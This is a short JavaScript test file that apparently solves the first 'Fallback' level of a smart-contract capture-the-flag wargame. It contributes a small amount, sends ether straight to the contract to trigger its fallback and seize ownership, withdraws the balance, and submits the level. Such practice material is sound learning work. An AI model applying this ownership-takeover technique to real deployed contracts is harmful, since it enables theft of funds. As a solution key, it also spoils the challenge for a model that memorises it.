const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Fallback");
  const challengeAddress = await createChallenge(`0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 1-Fallback", async function () {
  const challenge = await getChallenge();

  tx = await challenge.contribute({value: 1});
  await tx.wait();

  [eoa] = await ethers.getSigners();
  tx = await eoa.sendTransaction({
    to: await challenge.getAddress(),
    value: 1
  })
  await tx.wait();

  tx = await challenge.withdraw();
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
